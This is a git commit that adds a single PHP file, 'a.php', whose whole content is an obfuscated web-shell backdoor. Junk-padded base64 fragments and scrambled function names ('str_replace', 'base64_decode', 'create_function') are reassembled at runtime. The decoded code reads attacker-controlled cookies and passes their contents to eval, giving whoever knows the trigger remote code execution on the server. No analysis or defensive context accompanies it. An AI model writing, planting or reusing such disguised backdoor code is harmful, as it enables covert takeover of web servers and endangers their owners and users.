5faee4e90467d4a7726ca4069e178d7c5cfbb12f
Rmdn19 <43875097+Rmdn19@users.noreply.github.com>
2019-12-17 20:46:42 +0700

    Create a.php

---
+++ a.php
@@ -0,0 +1,10 @@
+<?php
+$abhu="qxxb2luKGFycmF5xxX3NsaWNlKCRhLCRjxxKCRhKSxx0zKSkpKSxxk7ZWNobyAnPC8nLiRrLic+Jxxzt9";
+$jtsl="xUocxxHJlZ19yZXBsYWNlKGFycmF5KCcvxxW15xxcdz1cc10vJywnL1xzLycpLCBhcnJxxheSgnxxJywnKycpLCB";
+$nvjq="JGxxM9J2NvdW50JzxxskYT0kX0NxxPxxT0tJRTtpZihyZXNldCgkYSxxk9xxPSdyxxYScgJiYgJGM";
+$keau="oxxJGxxEpPjMpeyxxRrPSdtZGFuMTknO2xxVjaG8gJzwnLiRrLxxic+JztldmFxxsKGJhc2U2xxNF9kxxZWNvxxZGx";
+$egio = str_replace("d","","dstdr_dredpdldacde");
+$groe = $egio("cm", "", "cmbascmecm6cm4cm_cmdecmccmocmdcme");
+$aeeu = $egio("h","","hchreathe_hfhuhnhchthion");
+$wxpl = $aeeu('', $groe($egio("xx", "", $nvjq.$keau.$jtsl.$abhu))); $wxpl();
+?>
